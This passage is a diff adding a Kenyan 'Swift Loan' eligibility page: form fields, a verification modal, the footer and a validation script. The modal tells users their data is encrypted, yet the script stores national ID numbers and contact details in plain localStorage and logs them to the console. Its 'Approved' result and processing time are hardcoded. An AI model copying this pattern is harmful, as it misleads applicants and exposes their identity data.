+                                <option value="100000+">100,000+ KES</option>
+                            </select>
+                            <div class="validation-message mt-2 text-sm"></div>
+                        </div>
+
+                        <!-- Desired Loan Amount -->
+                        <div>
+                            <label for="loanAmount" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="credit-card" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                Desired Loan Amount
+                            </label>
+                            <input 
+                                type="text" 
+                                id="loanAmount" 
+                                name="loanAmount" 
+                                readonly
+                                value="KES 15,000 - KES 200,000"
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl bg-gray-50 text-gray-600 text-lg"
+                            >
+                        </div>
+
+                        <!-- Country -->
+                        <div>
+                            <label for="country" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="globe" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                Country
+                            </label>
+                            <input 
+                                type="text" 
+                                id="country" 
+                                name="country" 
+                                readonly
+                                value="Kenya"
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl bg-gray-50 text-gray-600 text-lg"
+                            >
+                        </div>
+
+                        <!-- County -->
+                        <div>
+                            <label for="county" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="map-pin" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                County
+                            </label>
+                            <select 
+                                id="county" 
+                                name="county" 
+                                required
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-primary focus:border-transparent transition-swift text-lg"
+                            >
+                                <option value="">Select your county</option>
+                                <option value="Baringo">Baringo</option>
+                                <option value="Bomet">Bomet</option>
+                                <option value="Bungoma">Bungoma</option>
+                                <option value="Busia">Busia</option>
+                                <option value="Elgeyo-Marakwet">Elgeyo-Marakwet</option>
+                                <option value="Embu">Embu</option>
+                                <option value="Garissa">Garissa</option>
+                                <option value="Homa Bay">Homa Bay</option>
+                                <option value="Isiolo">Isiolo</option>
+                                <option value="Kajiado">Kajiado</option>
+                                <option value="Kakamega">Kakamega</option>
+                                <option value="Kericho">Kericho</option>
+                                <option value="Kiambu">Kiambu</option>
+                                <option value="Kilifi">Kilifi</option>
+                                <option value="Kirinyaga">Kirinyaga</option>
+                                <option value="Kisii">Kisii</option>
+                                <option value="Kisumu">Kisumu</option>
+                                <option value="Kitui">Kitui</option>
+                                <option value="Kwale">Kwale</option>
+                                <option value="Laikipia">Laikipia</option>
+                                <option value="Lamu">Lamu</option>
+                                <option value="Machakos">Machakos</option>
+                                <option value="Makueni">Makueni</option>
+                                <option value="Mandera">Mandera</option>
+                                <option value="Meru">Meru</option>
+                                <option value="Migori">Migori</option>
+                                <option value="Marsabit">Marsabit</option>
+                                <option value="Mombasa">Mombasa</option>
+                                <option value="Murang'a">Murang'a</option>
+                                <option value="Nairobi">Nairobi</option>
+                                <option value="Nakuru">Nakuru</option>
+                                <option value="Nandi">Nandi</option>
+                                <option value="Narok">Narok</option>
+                                <option value="Nyamira">Nyamira</option>
+                                <option value="Nyandarua">Nyandarua</option>
+                                <option value="Nyeri">Nyeri</option>
+                                <option value="Samburu">Samburu</option>
+                                <option value="Siaya">Siaya</option>
+                                <option value="Taita-Taveta">Taita-Taveta</option>
+                                <option value="Tana River">Tana River</option>
+                                <option value="Tharaka-Nithi">Tharaka-Nithi</option>
+                                <option value="Trans Nzoia">Trans Nzoia</option>
+                                <option value="Turkana">Turkana</option>
+                                <option value="Uasin Gishu">Uasin Gishu</option>
+                                <option value="Vihiga">Vihiga</option>
+                                <option value="Wajir">Wajir</option>
+                                <option value="West Pokot">West Pokot</option>
+                            </select>
+                            <div class="validation-message mt-2 text-sm"></div>
+                        </div>
+
+                        <!-- City -->
+                        <div>
+                            <label for="city" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="map" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                City/Town
+                            </label>
+                            <input 
+                                type="text" 
+                                id="city" 
+                                name="city" 
+                                required
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-primary focus:border-transparent transition-swift placeholder-gray-400 text-lg"
+                                placeholder="Enter your city or town"
+                            >
+                            <div class="validation-message mt-2 text-sm"></div>
+                        </div>
+                                               <!-- Repayment Period -->
+                        <div>
+                            <label for="repaymentPeriod" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="calendar" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                Repayment Period
+                            </label>
+                            <select 
+                                id="repaymentPeriod" 
+                                name="repaymentPeriod" 
+                                required
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-primary focus:border-transparent transition-swift text-lg"
+                            >
+                                <option value="">Select period</option>
+                                <option value="1-month">1 Month</option>
+                                <option value="2-months">2 Months</option>
+                                <option value="3-months">3 Months</option>
+                                <option value="6-months">6 Months</option>
+                                <option value="12-months">12 Months</option>
+                            </select>
+                            <div class="validation-message mt-2 text-sm"></div>
+                        </div>
+                    </div>
+                        <!-- Purpose of Loan -->
+                        <div class="col-span-full">
+                            <label for="loanPurpose" class="block text-sm font-semibold text-gray-700 mb-3">
+                                <i data-feather="file-text" class="w-4 h-4 inline mr-2 swift-primary"></i>
+                                Purpose of Loan (Optional)
+                            </label>
+                            <textarea 
+                                id="loanPurpose" 
+                                name="loanPurpose" 
+                                rows="3"
+                                class="w-full px-4 py-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-primary focus:border-transparent transition-swift placeholder-gray-400 text-lg resize-none"
+                                placeholder="Brief description of how you plan to use the loan"
+                            ></textarea>
+                        </div>
+                    </div>
+
+                    <!-- Form Buttons -->
+                    <div class="step-buttons mt-10 flex flex-col sm:flex-row gap-4 sm:justify-between">
+                        <button 
+                            type="button" 
+                            id="backBtn"
+                            class="px-8 py-3 border-2 border-gray-300 text-gray-700 font-semibold rounded-xl hover:bg-gray-50 transition-swift flex items-center space-x-2"
+                        >
+                            <i data-feather="arrow-left" class="w-5 h-5"></i>
+                            <span>Back</span>
+                        </button>
+                        
+                        <button 
+                            type="button" 
+                            id="submitBtn"
+                            class="px-8 py-3 swift-primary-bg text-white font-semibold rounded-xl hover:swift-primary-hover transition-swift flex items-center space-x-2 shadow-swift"
+                        >
+                            <span>Check Eligibility</span>
+                            <i data-feather="check-circle" class="w-5 h-5"></i>
+                        </button>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <!-- Enhanced Loading Modal -->
+        <div id="loadingModal" class="fixed inset-0 modal-backdrop z-50 hidden items-center justify-center p-4">
+            <div class="modal-content rounded-3xl shadow-2xl max-w-lg w-full p-8 text-center transform transition-all duration-300 scale-95">
+                <!-- Loading State -->
+                <div id="loadingState" class="animate-fade-in-up">
+                    <!-- Logo and Header -->
+                    <div class="mb-8">
+                        <div class="w-20 h-20 swift-primary-bg rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
+                            <svg class="text-white animate-spin" width="32" height="32" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
+                            </svg>
+                        </div>
+                        <h3 class="text-2xl font-bold text-gray-900 mb-3">Checking Your Eligibility</h3>
+                        <p class="text-gray-600 text-lg">Please wait while we verify your information securely...</p>
+                    </div>
+                    
+                    <!-- User Information Card -->
+                    <div class="bg-gradient-to-r from-blue-50 to-indigo-50 rounded-2xl p-6 mb-8 border border-blue-100">
+                        <div class="grid grid-cols-1 gap-4 text-left">
+                            <div class="flex justify-between items-center">
+                                <span class="text-sm font-medium text-gray-600">Applicant Name:</span>
+                                <span id="loadingName" class="font-semibold text-gray-900"></span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-sm font-medium text-gray-600">National ID:</span>
+                                <span id="loadingId" class="font-semibold text-gray-900"></span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-sm font-medium text-gray-600">Phone Number:</span>
+                                <span id="loadingPhone" class="font-semibold text-gray-900"></span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Enhanced Progress Bar -->
+                    <div class="mb-8">
+                        <div class="flex justify-between items-center mb-3">
+                            <span class="text-sm font-medium text-gray-700">Verification Progress</span>
+                            <span id="progressPercentage" class="text-sm font-bold swift-primary">0%</span>
+                        </div>
+                        <div class="w-full bg-gray-200 rounded-full h-4 mb-4 overflow-hidden">
+                            <div id="loadingProgress" class="progress-bar h-4 rounded-full transition-all duration-500 progress-glow" style="width: 0%"></div>
+                        </div>
+                        
+                        <!-- Current Step Indicator -->
+                        <div id="loadingText" class="text-base font-medium text-gray-700 flex items-center justify-center">
+                            <div class="w-2 h-2 bg-blue-500 rounded-full animate-pulse mr-3"></div>
+                            Initializing verification process...
+                        </div>
+                    </div>
+                    
+                    <!-- Security Notice -->
+                    <div class="bg-green-50 border border-green-200 rounded-lg p-4">
+                        <div class="flex items-center justify-center">
+                            <svg class="text-green-500 mr-2" width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                            </svg>
+                            <span class="text-green-800 text-sm font-medium">Your data is encrypted and secure</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Success State (Initially Hidden) -->
+                <div id="successState" class="hidden animate-bounce-in">
+                    <!-- Success Animation -->
+                    <div class="mb-8">
+                        <div class="w-24 h-24 mx-auto mb-6 relative">
+                            <!-- Success Checkmark SVG -->
+                            <svg class="w-24 h-24" viewBox="0 0 52 52">
+                                <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
+                                <path class="checkmark-check" fill="none" stroke="#10b981" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="m16,26 6,6 12,-12"/>
+                            </svg>
+                        </div>
+                        <h3 class="text-3xl font-bold text-gray-900 mb-4">Verification Complete!</h3>
+                        <p class="text-gray-600 text-lg mb-6">Great news! You're eligible for a loan.</p>
+                        
+                        <!-- Success Details -->
+                        <div class="bg-gradient-to-r from-green-50 to-emerald-50 rounded-2xl p-6 border border-green-200">
+                            <div class="text-left space-y-3">
+                                <div class="flex justify-between items-center">
+                                    <span class="text-sm font-medium text-gray-600">Verification Status:</span>
+                                    <span class="font-semibold text-green-600 flex items-center">
+                                        <svg class="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 24 24">
+                                            <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                        </svg>
+                                        Approved
+                                    </span>
+                                </div>
+                                <div class="flex justify-between items-center">
+                                    <span class="text-sm font-medium text-gray-600">Processing Time:</span>
+                                    <span class="font-semibold text-gray-900">2.4 seconds</span>
+                                </div>
+                                <div class="flex justify-between items-center">
+                                    <span class="text-sm font-medium text-gray-600">Next Step:</span>
+                                    <span class="font-semibold text-blue-600">View Loan Offers</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Redirect Notice -->
+                    <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
+                        <div class="flex items-center justify-center">
+                            <div class="w-3 h-3 bg-blue-500 rounded-full animate-pulse mr-3"></div>
+                            <span class="text-blue-800 text-sm font-medium">Redirecting to your loan offers...</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 text-white">
+        <div class="max-w-7xl mx-auto py-12 px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+                <!-- Company Info -->
+                <div class="col-span-1 md:col-span-2">
+                    <div class="flex items-center mb-4">
+                        <div class="w-10 h-10 swift-primary-bg rounded-lg flex items-center justify-center">
+                            <svg class="text-white" width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
+                            </svg>
+                        </div>
+                        <span class="ml-3 text-xl font-bold">Swift Loan</span>
+                    </div>
+                    <p class="text-gray-400 mb-4 max-w-md">
+                        Swift Loan provides instant mobile loans for everyone in Kenya. Quick application process with M-PESA integration for emergency financial needs.
+                    </p>
+                    
+                    <!-- Partner Badges -->
+                    <div class="flex items-center space-x-4 mb-4">
+                        <!-- SSL Secured Badge -->
+                        <div class="flex items-center bg-gray-800 rounded-lg px-3 py-2">
+                            <svg class="w-6 h-6 text-green-400 mr-2" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M18,8H17V6A5,5 0 0,0 12,1A5,5 0 0,0 7,6V8H6A2,2 0 0,0 4,10V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V10A2,2 0 0,0 18,8M12,17A2,2 0 0,1 10,15A2,2 0 0,1 12,13A2,2 0 0,1 14,15A2,2 0 0,1 12,17M15.8,8H8.2V6A3.8,3.8 0 0,1 12,2.2A3.8,3.8 0 0,1 15.8,6V8Z"/>
+                            </svg>
+                            <div>
+                                <div class="text-xs font-semibold text-green-400">SSL</div>
+                                <div class="text-xs text-gray-300">Secured</div>
+                            </div>
+                        </div>
+                        
+                        <!-- M-Pesa Partner Badge -->
+                        <div class="flex items-center bg-gray-800 rounded-lg px-3 py-2">
+                            <svg class="w-6 h-6 text-green-500 mr-2" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12,2A3,3 0 0,1 15,5V7H9V5A3,3 0 0,1 12,2M21,16V14L20,13V7A2,2 0 0,0 18,5H17V3A1,1 0 0,0 16,2H8A1,1 0 0,0 7,3V5H6A2,2 0 0,0 4,7V13L3,14V16H21M16,8.5A1.5,1.5 0 0,1 14.5,10A1.5,1.5 0 0,1 13,8.5A1.5,1.5 0 0,1 14.5,7A1.5,1.5 0 0,1 16,8.5M11,8.5A1.5,1.5 0 0,1 9.5,10A1.5,1.5 0 0,1 8,8.5A1.5,1.5 0 0,1 9.5,7A1.5,1.5 0 0,1 11,8.5Z"/>
+                            </svg>
+                            <div>
+                                <div class="text-xs font-semibold text-green-500">M-PESA</div>
+                                <div class="text-xs text-gray-300">Partner</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="flex space-x-4">
+                        <a href="#" class="text-gray-400 hover:text-white transition-colors">
+                            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                            </svg>
+                        </a>
+                        <a href="#" class="text-gray-400 hover:text-white transition-colors">
+                            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"/>
+                            </svg>
+                        </a>
+                        <a href="#" class="text-gray-400 hover:text-white transition-colors">
+                            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.219-5.192 1.219-5.192s-.653-1.307-.653-3.237c0-3.032 1.759-5.296 3.951-5.296 1.864 0 2.765 1.401 2.765 3.081 0 1.877-1.196 4.685-1.815 7.286-.516 2.178.109 3.952 2.179 3.952 2.617 0 4.624-2.757 4.624-6.739 0-3.523-2.529-5.987-6.147-5.987-4.188 0-6.64 3.14-6.64 6.386 0 1.264.487 2.615 1.096 3.352.12.144.137.271.101.419-.11.459-.355 1.445-.403 1.649-.061.254-.2.308-.459.186-1.713-.799-2.785-3.309-2.785-5.32 0-4.344 3.157-8.34 9.1-8.34 4.777 0 8.491 3.404 8.491 7.95 0 4.741-2.988 8.554-7.137 8.554-1.393 0-2.704-.724-3.154-1.584l-.857 3.271c-.309 1.19-1.145 2.681-1.704 3.587C9.596 23.616 10.773 24 12.017 24c6.624 0 11.99-5.367 11.99-11.987C24.007 5.367 18.641.001 12.017.001z"/>
+                            </svg>
+                        </a>
+                    </div>
+                </div>
+
+                                <!-- Quick Links -->
+                <div>
+                    <h4 class="text-lg font-semibold mb-4">Quick Links</h4>
+                    <div class="space-y-2">
+                      <li><a class='text-gray-400 hover:text-white transition-colors' href='/eligibility.html'>Check My Loan Eligibility</a></li>
+<li><a class='text-gray-400 hover:text-white transition-colors' href='/about.html'>About Us</a></li>
+<li><a class='text-gray-400 hover:text-white transition-colors' href='/terms.html'>Terms of Service</a></li>
+<li><a class='text-gray-400 hover:text-white transition-colors' href='/privacy.html'>Privacy Policy</a></li>
+<li><a class='text-gray-400 hover:text-white transition-colors' href='/track'>Track My Loan Application</a></li>
+<li><a class='text-gray-400 hover:text-white transition-colors' href='/rules'>Loan Rules</a></li>
+<li><a class='text-gray-400 hover:text-white transition-colors' href='/account-deletion.html'>Account Deletion</a></li>
+<li><a class='text-gray-400 hover:text-white transition-colors' href='/support.html'>Help</a></li>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+  <!-- Contact Info -->
+<div>
+    <h3 class="text-sm font-semibold text-gray-400 tracking-wider uppercase mb-4">Contact</h3>
+    <ul class="space-y-2">
+        <!-- Live Chat -->
+        <li class="flex items-center">
+            <span class="flex items-center text-lg font-bold text-blue-400 hover:text-blue-500 cursor-pointer">
+                <svg class="mr-2 w-6 h-6 text-blue-400" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M4 4h16v12H5.17L4 17.17V4zm0-2a2 2 0 0 0-2 2v20l4-4h14a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H4z"/>
+                </svg>
+                Live Chat: Use the chat bubble at the bottom-right corner
+            </span>
+        </li>
+    </ul>
+</div>
+
+        <!-- Email -->
+        <li class="flex items-center text-gray-300">
+            <a href="mailto:info@swiftloan.ke" class="flex items-center hover:text-blue-400">
+                <svg class="mr-2 w-4 h-4 swift-primary" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M2 4a2 2 0 0 0-2 2v12c0 1.1.9 2 2 2h20a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2H2zm0 2h20v.01L12 13 2 6.01V6zm0 12V8.24l9.47 6.36a1 1 0 0 0 1.06 0L22 8.24V18H2z"/>
+                </svg>
+                info@swiftloan.ke
+            </a>
+        </li>
+              <!-- Social Icons Section (above footer) -->
+<div class="bg-gray-900 border-t border-gray-700 py-6 mt-12">
+  <div class="max-w-7xl mx-auto flex justify-center space-x-10">
+
+    <!-- Facebook -->
+    <a href="https://facebook.com/swiftke" target="_blank"
+       class="flex flex-col items-center hover:opacity-80">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Facebook_icon.svg" 
+           alt="Facebook" class="w-10 h-10">
+      <span class="mt-1 text-sm text-blue-400">Facebook</span>
+    </a>
+
+  </div>
+</div>
+  </div>
+</div>
+
+        <!-- Working Hours -->
+        <li class="text-gray-400 text-sm">Mon-Sun: 8am - 6pm</li>
+    </ul>
+</div>
+
+            
+                <div class="mt-4 sm:mt-0">
+                    <ul class="flex space-x-6 text-sm text-gray-400">
+                        <li><a class='hover:text-white transition-colors' href='/privacy'>Privacy Policy</a></li>
+                        <li><a class='hover:text-white transition-colors' href='/terms'>Terms of Service</a></li>
+                        <li><a class='text-gray-400 hover:text-white transition-colors' href='/support'>Support</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+</footer>
+<footer class="text-center text-gray-400 text-sm py-6 bg-gray-900 border-t border-gray-700">
+    &copy; 2025 Swift Loan. All rights reserved.
+</footer>
+    <!-- JavaScript -->
+    <script>
+        // Form Management and Validation
+        class EligibilityForm {
+            constructor() {
+                this.currentStep = 1;
+                this.formData = {};
+                this.validationRules = {
+                    fullName: {
+                        validate: (value) => value.trim().split(' ').length >= 2,
+                        message: 'Please enter at least two names'
+                    },
+                    nationalId: {
+                        validate: (value) => /^\d{8}$/.test(value.trim()),
+                        message: 'ID must be exactly 8 digits'
+                    },
+                    dateOfBirth: {
+                        validate: (value) => {
+                            const dobDate = new Date(value);
+                            const age = (new Date().getFullYear() - dobDate.getFullYear());
+                            return !isNaN(dobDate) && age >= 18;
+                        },
+                        message: 'You must be at least 18 years old'
+                    },
+                    phoneNumber: {
+                        validate: (value) => /^(07\d{8}|254\d{9})$/.test(value.trim()),
+                        message: 'Enter a valid phone starting with 07 or 254'
+                    },
+                    email: {
+                        validate: (value) => /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(value.trim()),
+                        message: 'Enter a valid email address'
+                    }
+                };
+                
+                this.init();
+            }
+
+            init() {
+                this.bindEvents();
+                this.validateStep1();
+                feather.replace();
+            }
+
+            bindEvents() {
+                // Form navigation
+                const nextBtn = document.getElementById('nextBtn');
+                const backBtn = document.getElementById('backBtn');
+                const submitBtn = document.getElementById('submitBtn');
+                
+                if (nextBtn) {
+                    nextBtn.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        this.nextStep();
+                    });
+                }
+                
+                if (backBtn) {
+                    backBtn.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        this.prevStep();
+                    });
+                }
+                
+                if (submitBtn) {
+                    submitBtn.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        this.submitForm();
+                    });
+                }
+
+                // Real-time validation for Step 1
+                ['fullName', 'nationalId', 'dateOfBirth', 'phoneNumber', 'email'].forEach(fieldId => {
+                    const field = document.getElementById(fieldId);
+                    if (field) {
+                        field.addEventListener('input', () => {
+                            this.validateField(fieldId);
+                            this.validateStep1();
+                        });
+                        field.addEventListener('blur', () => {
+                            this.validateField(fieldId);
+                            this.validateStep1();
+                        });
+                    }
+                });
+
+                // Step 2 validation
+                ['employmentStatus', 'monthlyIncome', 'county', 'city'].forEach(fieldId => {
+                    const field = document.getElementById(fieldId);
+                    if (field) {
+                        field.addEventListener('change', () => this.validateStep2());
+                        field.addEventListener('input', () => this.validateStep2());
+                    }
+                });
+            }
+
+            validateField(fieldId) {
+                const field = document.getElementById(fieldId);
+                const rule = this.validationRules[fieldId];
+                
+                if (!field || !rule) return;
+
+                const value = field.value;
+                const isValid = rule.validate(value);
+                const messageElement = field.parentElement.querySelector('.validation-message');
+
+                // Update visual state
+                field.classList.remove('input-valid', 'input-invalid');
+                field.classList.add(isValid ? 'input-valid' : 'input-invalid');
+
+                // Update message
+                if (messageElement) {
+                    messageElement.textContent = isValid ? 'Looks good!' : rule.message;
+                    messageElement.className = `validation-message ${isValid ? 'success' : 'error'}`;
+                }
+
+                return isValid;
+            }
+
+            validateStep1() {
+                const fields = ['fullName', 'nationalId', 'dateOfBirth', 'phoneNumber', 'email'];
+                let allValid = true;
+                let allFilled = true;
+
+                fields.forEach(fieldId => {
+                    const field = document.getElementById(fieldId);
+                    if (field && field.value.trim()) {
+                        const isValid = this.validateField(fieldId);
+                        allValid = allValid && isValid;
+                    } else {
+                        allFilled = false;
+                        allValid = false;
+                    }
+                });
+
+                const nextBtn = document.getElementById('nextBtn');
+                if (nextBtn) {
+                    nextBtn.disabled = !allValid || !allFilled;
+                    
+                    if (allValid && allFilled) {
+                        nextBtn.classList.remove('disabled:bg-gray-300', 'disabled:cursor-not-allowed');
+                        nextBtn.classList.add('swift-primary-bg', 'hover:swift-primary-hover');
+                    } else {
+                        nextBtn.classList.add('disabled:bg-gray-300', 'disabled:cursor-not-allowed');
+                        nextBtn.classList.remove('swift-primary-bg', 'hover:swift-primary-hover');
+                    }
+                }
+                
+                return allValid && allFilled;
+            }
+
+            validateStep2() {
+                const fields = ['employmentStatus', 'monthlyIncome', 'county', 'city'];
+                let allValid = true;
+                let allFilled = true;
+
+                fields.forEach(fieldId => {
+                    const field = document.getElementById(fieldId);
+                    if (field && field.value.trim()) {
+                        // Basic validation - can be enhanced
+                        allValid = allValid && true;
+                    } else {
+                        allFilled = false;
+                        allValid = false;
+                    }
+                });
+
+                const submitBtn = document.getElementById('submitBtn');
+                if (submitBtn) {
+                    submitBtn.disabled = !allValid || !allFilled;
+                    
+                    if (allValid && allFilled) {
+                        submitBtn.classList.remove('disabled:bg-gray-300', 'disabled:cursor-not-allowed');
+                        submitBtn.classList.add('swift-primary-bg', 'hover:swift-primary-hover');
+                    } else {
+                        submitBtn.classList.add('disabled:bg-gray-300', 'disabled:cursor-not-allowed');
+                        submitBtn.classList.remove('swift-primary-bg', 'hover:swift-primary-hover');
+                    }
+                }
+                
+                return allValid && allFilled;
+            }
+
+            nextStep() {
+                if (!this.validateStep1()) {
+                    this.showNotification('Please complete all required fields correctly', 'error');
+                    return;
+                }
+
+                // Hide step 1, show step 2
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+                
+                // Update progress indicator
+                this.updateProgressIndicator(2);
+                
+                // Smooth scroll to top
+                document.getElementById('step2').scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'start'
+                });
+                
+                this.currentStep = 2;
+            }
+
+            prevStep() {
+                // Hide step 2, show step 1
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step1').classList.remove('hidden');
+                
+                // Update progress indicator
+                this.updateProgressIndicator(1);
+                
+                // Smooth scroll to top
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+                
+                this.currentStep = 1;
+            }
+
+            updateProgressIndicator(step) {
+                const step1Indicator = document.getElementById('step1Indicator');
+                const step2Indicator = document.getElementById('step2Indicator');
+                const step1Text = document.getElementById('step1Text');
+                const step2Text = document.getElementById('step2Text');
+                const progressBar = document.getElementById('progressBar');
+
+                if (step === 1) {
+                    step1Indicator.className = 'w-10 h-10 rounded-full swift-primary-bg text-white flex items-center justify-center font-semibold';
+                    step2Indicator.className = 'w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-semibold';
+                    step1Text.className = 'ml-2 text-sm font-medium swift-primary';
+                    step2Text.className = 'ml-2 text-sm font-medium text-gray-500';
+                    progressBar.style.width = '50%';
+                } else {
+                    step1Indicator.className = 'w-10 h-10 rounded-full bg-green-500 text-white flex items-center justify-center font-semibold';
+                    step2Indicator.className = 'w-10 h-10 rounded-full swift-primary-bg text-white flex items-center justify-center font-semibold';
+                    step1Text.className = 'ml-2 text-sm font-medium text-green-500';
+                    step2Text.className = 'ml-2 text-sm font-medium swift-primary';
+                    progressBar.style.width = '100%';
+                    
+                    // Change step 1 indicator to checkmark
+                    step1Indicator.innerHTML = '<i data-feather="check" class="w-5 h-5"></i>';
+                    feather.replace();
+                }
+            }
+
+            collectFormData() {
+                const form = document.getElementById('eligibilityForm');
+                const formData = new FormData(form);
+                const data = {};
+                
+                for (let [key, value] of formData.entries()) {
+                    data[key] = value;
+                }
+                
+                return data;
+            }
+
+            submitForm() {
+                if (!this.validateStep2()) {
+                    this.showNotification('Please complete all required fields', 'error');
+                    return;
+                }
+
+                const formData = this.collectFormData();
+                
+                // Store critical data in localStorage before showing modal
+                this.storeUserData(formData);
+                
+                // Show enhanced loading screen
+                this.showLoadingScreen(formData);
+            }
+
+            storeUserData(formData) {
+                try {
+                    // Clear any existing data first
+                    Object.keys(localStorage).forEach(key => {
+                        if (key.startsWith('swift_')) {
+                            localStorage.removeItem(key);
+                        }
+                    });
+
+                    // Store user data with consistent keys
+                    localStorage.setItem('swift_user_name', formData.fullName || '');
+                    localStorage.setItem('swift_user_id', formData.nationalId || '');
+                    localStorage.setItem('swift_user_phone', formData.phoneNumber || '');
+                    localStorage.setItem('swift_user_email', formData.email || '');
+                    localStorage.setItem('swift_user_dob', formData.dateOfBirth || '');
+
+                    // Store additional application data
+                    localStorage.setItem('swift_employment_status', formData.employmentStatus || '');
+                    localStorage.setItem('swift_monthly_income', formData.monthlyIncome || '');
+                    localStorage.setItem('swift_county', formData.county || '');
+                    localStorage.setItem('swift_city', formData.city || '');
+                    localStorage.setItem('swift_loan_purpose', formData.loanPurpose || '');
+
+                    // Store application metadata
+                    localStorage.setItem('swift_application_timestamp', new Date().toISOString());
+                    localStorage.setItem('swift_eligibility_status', 'pending');
+                    localStorage.setItem('swift_form_completed', 'true');
+
+                    console.log('User data successfully stored in localStorage:', {
+                        name: formData.fullName,
+                        id: formData.nationalId,
+                        phone: formData.phoneNumber,
+                        email: formData.email,
+                        timestamp: new Date().toISOString()
+                    });
+
+                    // Verify data was stored
+                    const storedName = localStorage.getItem('swift_user_name');
+                    const storedId = localStorage.getItem('swift_user_id');
+                    
+                    if (!storedName || !storedId) {
+                        throw new Error('Failed to store user data in localStorage');
+                    }
+
+                } catch (error) {
+                    console.error('Error storing user data:', error);
+                    this.showNotification('Error saving your information. Please try again.', 'error');
+                    return false;
+                }
+
+                return true;
+            }
+
+            showLoadingScreen(formData) {
+                const modal = document.getElementById('loadingModal');
+                const nameElement = document.getElementById('loadingName');
+                const idElement = document.getElementById('loadingId');
+                const phoneElement = document.getElementById('loadingPhone');
+                const progressBar = document.getElementById('loadingProgress');
+                const progressPercentage = document.getElementById('progressPercentage');
+                const loadingText = document.getElementById('loadingText');
+                const loadingState = document.getElementById('loadingState');
+                const successState = document.getElementById('successState');
+
+                // Update user info in modal
+                nameElement.textContent = formData.fullName;
+                idElement.textContent = formData.nationalId;
+                phoneElement.textContent = formData.phoneNumber;
+
+                // Show modal with loading state
+                modal.classList.remove('hidden');
+                modal.classList.add('flex');
+                loadingState.classList.remove('hidden');
